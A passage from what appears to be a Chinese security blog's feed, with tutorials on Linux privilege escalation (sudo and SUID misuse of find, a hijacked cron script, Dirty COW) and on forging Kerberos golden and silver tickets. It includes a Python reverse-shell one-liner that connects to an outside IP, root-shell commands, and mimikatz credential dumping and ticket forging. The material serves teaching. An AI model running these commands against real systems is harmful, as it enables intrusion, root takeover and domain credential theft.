    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问任何sudo用户，他就可以基本上以root特权执行任何命令。</p><p>管理员可能只允许用户通过SUDO运行一些命令，可能在没有察觉的情况下中引入漏洞，这可能导致权限提升。</p><p>一个典型的例子是将SUDO权限分配给find命令，以便其他用户可以在系统中搜索特定的文件相关文件。尽管管理员可能不知道’find’命令包含用于执行命令的参数，但攻击者可以以root特权执行命令。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>拿到普通用户权限之后，使用<code>sudo –l</code>查看下， 查看当前是否存在当前用户可以调用sudo的命令，如下图，当前用户可以执行find命令，然后通过find命令获取root权限。</p><pre><code class="hljs bash">sudo /usr/bin/find /home -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSudo%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/01.jpg" alt="root"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;如果攻击者无法通过其他任何方法直接获得root用户访问权限，则他可能会尝试损害具有SUDO访问权限的任何用户。一旦他可以访问</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之Suid提权</title>
    <link href="http://www.secice.cn/p/a20c8cf4"/>
    <id>http://www.secice.cn/p/a20c8cf4</id>
    <published>2020-11-27T05:44:54.000Z</published>
    <updated>2020-12-13T11:14:57.910Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。只要低特权用户执行suid权限程序，便会以root特权执行。</p><p>SUID是一项功能，如果使用得当，它实际上可以增强Linux的安全性。问题在于，管理员在安装第三方应用程序或进行逻辑配置更改时可能会在不知不觉中引入危险的SUID配置。</p><p>许多系统管理员不知道应该在什么情况设置SUID位，SUID位不应该设置在文件编辑器上，因为攻击者可以修改系统上存在的任何文件。</p><h2 id="常见的可用于suid提权的命令"><a href="#常见的可用于suid提权的命令" class="headerlink" title="常见的可用于suid提权的命令"></a>常见的可用于suid提权的命令</h2><pre><code class="hljs bash">NmapVimfindBashMoreLessNanocp</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用LinEnum.sh来收集要提权的机器上的信息，该脚本主要用来收集Linux上的信息。</p><p>该脚本的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum</code></pre><p>执行LinEnum之后，发现find这个命令有SUID权限。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/01.jpg" alt="收集信息"></p><h3 id="确认-find-有-root-执行权限"><a href="#确认-find-有-root-执行权限" class="headerlink" title="确认 find 有 root 执行权限"></a>确认 find 有 root 执行权限</h3><p>执行命令</p><pre><code class="hljs bash">touch ice/usr/bin/find ice -<span class="hljs-built_in">exec</span> whoami \;</code></pre><p>确认 find 命令是否是 root 权限执行.</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/02.jpg" alt="root"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>如果目标机上有 python 环境，可以使用 python 命令反弹 shell：</p><pre><code class="hljs bash"><span class="hljs-comment">#反弹一个sh类型的shell</span>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></code></pre><p>结合 find :</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.165&quot;,8989));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> \;</code></pre><p>但是反弹的 shell 不是 root 权限，在本机上 find 执行 id 时，有一个 euid <code>（euid 就是我们通常说的 suid， 或者叫 excute user id，它使文件执行时拥有该文件所有者的权限。）</code>为 root 权限，但是反弹 shell 中并没有。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/03.jpg" alt="非root权限"></p><p>默认情况下 bash 在执行时，如果发现 euid 和 uid 不匹配，会将 euid（即 suid） 强制重置为uid 。如果使用了 -p 参数，则不会再覆盖。</p><p>我们尝试使用如下命令获取 shell：</p><pre><code class="hljs bash">/usr/bin/find ice -<span class="hljs-built_in">exec</span> /bin/bash -p \;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201127_Linux%E6%8F%90%E6%9D%83%E4%B9%8BSuid%E6%8F%90%E6%9D%83/04.jpg" alt="提权成功"></p><p>可以看到获取的 shell 为 root 权限。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;SUID代表设置的用户ID，是一种Linux功能，允许用户在指定用户的许可下执行文件。只要低特权用户执行suid权限程序，便</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之定时任务</title>
    <link href="http://www.secice.cn/p/75fd4604"/>
    <id>http://www.secice.cn/p/75fd4604</id>
    <published>2020-11-26T07:40:12.000Z</published>
    <updated>2020-12-13T11:15:01.456Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 /var/spool/cron/ 目录。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/01.png" alt="Linux提权之定时任务"></p><p>比如，在下面的crontab 命令中，就可以每个1个小时自动打印apach错误日志。</p><pre><code class="hljs bash">1 0 * * * <span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;&quot;</span> &gt; /var/<span class="hljs-built_in">log</span>/apache/error_log</code></pre><p>如果未正确配置Cron，则可以利用它获得root特权。</p><ol><li>cron作业中是否有可写的脚本或二进制文件？</li><li>我们可以覆盖cron文件本身吗？</li><li>cron.d目录可写吗？</li></ol><p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="创建一个定时任务"><a href="#创建一个定时任务" class="headerlink" title="创建一个定时任务"></a>创建一个定时任务</h3><p>目标：创建一个运行python脚本来擦除特定目录的所有数据<br>假设目录cleanup就是要擦除的目录，我们希望每隔2分钟就清除1次目录。首先，向该目录中创建一些文件：</p><pre><code class="hljs bash">mkdir cleanup<span class="hljs-built_in">cd</span> cleanup<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello freinds&quot;</span> &gt; 1.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ALL files will be deleted in 2 mints&quot;</span> &gt; 2.txt<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 1.php<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; 2.phpls</code></pre><p>下图是上面命令执行的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/02.png" alt="创建文件"></p><p>下面我们写一个python程序来删除 /home/cleanup的内容。</p><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmpvi cleanup.py</code></pre><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env python</span>import osimport systry:   os.system(<span class="hljs-string">&#x27;rm -r /root/cleanup/* &#x27;</span>)except:    sys.exit()</code></pre><p><code>chmod 777 cleanup.py</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/03.png" alt="创建文件"></p><p>编辑crontab添加定时任务，每隔2分钟运行一次cleanup.py脚本。</p><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>crontab*<span class="hljs-regexp">/2 *   * * *   root    /</span>tmp/cleanup.py</code></pre><p>下面是运行效果</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/04.png" alt="创建文件"></p><p>在真实环境下普通用户可能无法访问crontab文件，可以用pspy来监听进程。</p><p>pspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。</p><p>该工具的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/DominicBreuker/</span>pspy</code></pre><p>首先将pspy上传到目标机器：</p><p>1）chmod +x pspy64s</p><p>2）./pspy64</p><p>观察一段时间，发现/tmp/cleanup.py为root权限执行。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/05.png" alt="pspy64s"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/06.png" alt="pspy64s"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>查看/tmp/cleanup.py权限为普通用户可写</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/07.png" alt="查看权限"></p><p>打开文件，比如vi /tmp/cleanup.py，用下面的命令替换原来命令中的“os.system(‘rm -r /home/cleanup/* ‘)”：</p><pre><code class="hljs clean">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span>)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/08.png" alt="修改文件"></p><p>2分钟后，tmp目录下就会存在SUID权限的bash，运行<code>/tmp/bash -p </code>后就获取了root权限。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/09.png" alt="利用成功"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/10.png" alt="root权限"></p><p>提权成功。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权之内核漏洞</title>
    <link href="http://www.secice.cn/p/3574493e"/>
    <id>http://www.secice.cn/p/3574493e</id>
    <published>2020-11-26T03:12:42.000Z</published>
    <updated>2020-12-13T11:14:59.922Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。</p><p>Linux操作系统的内核是该系列操作系统的“灵魂大脑”，一旦出现安全隐患情况下，攻击者会很对这些安全隐患加以恶意利用，其中Linux内核漏洞是目前攻击者最为热爱的漏洞之一，内核漏洞的利用通常会以“上帝视角”，也就是所谓的操作系统最高权限的形式为攻击者提供对目标系统的超级用户访问权限。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>以Linux内核提权漏洞-“脏牛”来做演示。</p><p>给大家介绍下检查linux提权辅助工具，les该工具主要帮助检测linux内核的安全缺陷。</p><p>下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mzet-/</span>linux-exploit-suggester</code></pre><p>1.将linux-exploit-suggester.sh下载到要检查的主机上，主要使用以下两条指令：</p><pre><code class="hljs css"><span class="hljs-selector-tag">chmod</span> +<span class="hljs-selector-tag">x</span> <span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span>./<span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span></code></pre><p>在执行上述命令之前，首先查看Linux内核版本。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/01.png" alt="查看Linux内核版本"></p><p>查看脚本执行结果，可以使用脏牛来进行提权。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/02.png" alt="执行结果"></p><p>2.将漏洞利用代码上传到目标机器，接下来编译并执行。</p><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-pthread</span> <span class="hljs-selector-tag">dirty</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">-lcrypt</span>./<span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">password</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/03.png" alt="编译"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/04.png" alt="运行"></p><p>3.该漏洞利用代码会加入一个uid为0的用户，使用<code>su firefart</code>切换到firefart用户，获取root权限。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。&lt;/p&gt;</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="http://www.secice.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos协议之黄金票据和白银票据</title>
    <link href="http://www.secice.cn/p/737303c7"/>
    <id>http://www.secice.cn/p/737303c7</id>
    <published>2020-11-25T03:42:55.000Z</published>
    <updated>2020-12-13T11:15:02.450Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket(黄金票据)"></a>Golden Ticket(黄金票据)</h2><p>在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。</p><p>那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门</p><h3 id="制作黄金票据的前提条件"><a href="#制作黄金票据的前提条件" class="headerlink" title="制作黄金票据的前提条件"></a>制作黄金票据的前提条件</h3><ul><li>1、krbtgt用户的hash(就意味着你已经有域控制器权限了)    cbcede6976ded273667a8e574a17092f</li><li>2、域名称    secice.cn</li><li>3、域的SID值    S-1-5-21-1431134449-3516206009-3475222595</li><li>4、要伪造的用户名(可以是任意用户甚至是不存在的用户)</li></ul><h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid：</p><pre><code class="hljs awk">mimikatz <span class="hljs-comment"># lsadump::dcsync /domain:secice.cn /user:krbtgt//导出 krbtgt 密码 hash</span>也可以mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:secice.cn /user:krbtgt&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt<span class="hljs-regexp">//</span>将导出的信息保存在<span class="hljs-number">1</span>.txt中</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/01.png" alt="黄金票据利用"></p><p>切换到普通域用户的机器，生成TGT凭证,用户名随意:</p><pre><code class="hljs awk">mimikatz <span class="hljs-comment"># kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt</span>也可以mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&quot;</span> <span class="hljs-string">&quot;kerberos::list&quot;</span> <span class="hljs-keyword">exit</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/02.png" alt="黄金票据利用"></p><blockquote><p>注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。</p></blockquote><h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket(白银票据)"></a>Silver Ticket(白银票据)</h2><p>白银票据是出现在TGS_REQ &amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。</p><h3 id="伪造白银票据的前提条件"><a href="#伪造白银票据的前提条件" class="headerlink" title="伪造白银票据的前提条件"></a>伪造白银票据的前提条件</h3><ul><li>1、域名称        secice.cn</li><li>2、域的 SID    S-1-5-21-1431134449-3516206009-3475222595</li><li>3、域的服务账号的密码 hash    f4bf5c36403ccc692e0bc5cf7f82a72a</li><li>4、伪造的用户名(可以是任意的)</li></ul><p>白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt.</p><h3 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h3><p>首先登录域控，dump机器hash</p><pre><code class="hljs awk">privilege::debugsekurlsa::logonpasswords也可以mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/03.png" alt="白银票据利用"></p><p>将hash和SID保存下来，在普通域用户机器中进行ptt（在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service）</p><pre><code class="hljs awk">mimikatz.exe privilege::debug <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /target:DC.secice.cn /service:cifs /rc4:f4bf5c36403ccc692e0bc5cf7f82a72a /user:aaa /ptt&quot;</span> <span class="hljs-keyword">exit</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/04.png" alt="白银票据利用"></p><p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/05.png" alt="白银票据利用"></p><p>不仅仅是cifs服务还有其他：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/06.png" alt="白银票据利用"></p><p>ldap可以用来dcsync</p><h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><ol><li>访问权限不同<br>Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限<br>Silver Ticket: 伪造 TGS,只能访问指定的服务</li><li>加密方式不同<br>Golden Ticket 由 krbtgt 的 Hash 加密<br>Silver Ticket 由服务账号(通常为计算机账户)Hash 加密</li><li>认证流程不同<br>Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Golden-Ticket-黄金票据&quot;&gt;&lt;a href=&quot;#Golden-Ticket-黄金票据&quot; class=&quot;headerlink&quot; title=&quot;Golden Ticket(黄金票据)&quot;&gt;&lt;/a&gt;Golden Ticket(黄金票据)&lt;/h2&gt;&lt;p&gt;在AS_</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://www.secice.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="域渗透" scheme="http://www.secice.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>域渗透之Kerberos协议</title>
    <link href="http://www.secice.cn/p/fe98a932"/>
    <id>http://www.secice.cn/p/fe98a932</id>
    <published>2020-11-23T03:42:55.000Z</published>
    <updated>2020-12-13T11:14:55.176Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kerberos-协议简介"><a href="#Kerberos-协议简介" class="headerlink" title="Kerberos 协议简介"></a>Kerberos 协议简介</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址 的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、 修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统 的密码技术(如:共享密钥)执行认证服务的。</p><h2 id="Kerberos-协议框架"><a href="#Kerberos-协议框架" class="headerlink" title="Kerberos 协议框架"></a>Kerberos 协议框架</h2><p>Kerberos 协议中主要有三个角色:</p><ul><li>访问服务的 Client</li><li>提供服务的 Server</li><li>KDC(Key Distribution Center)密钥分发中心</li></ul><p>KDC 默认安装在域控中，而 Client 和 Server 为域内的用户或者服务，如 web 应用、数</p><p>据库服务器和邮件服务器等。Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来 决定。</p><p>如果把 Kerberos 中的票据比作一张火车票，那么 Client 端就是乘客，Server 就是火车， 而 KDC 就是火车站的认证系统。如果 Client 端的票据是合法的(由你本人身份证购买并且 由你本人持有)同时有访问 Server 端服务的权限(车票对应车次正确)那么你才能上车。当 然和火车票不同的是 Kerberos 中有两张票据，而火车票只有一张。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/01.png" alt="Kerberos 协议框架"></p><p>由上图可以看出，KDC 又分为两个部分:</p><blockquote><p>Authentication Server:</p></blockquote><p>AS 的作用就是验证 Client 的身份(确认你是身份证上的本人)，</p><p>验证通过就给一张 TGT(Ticket 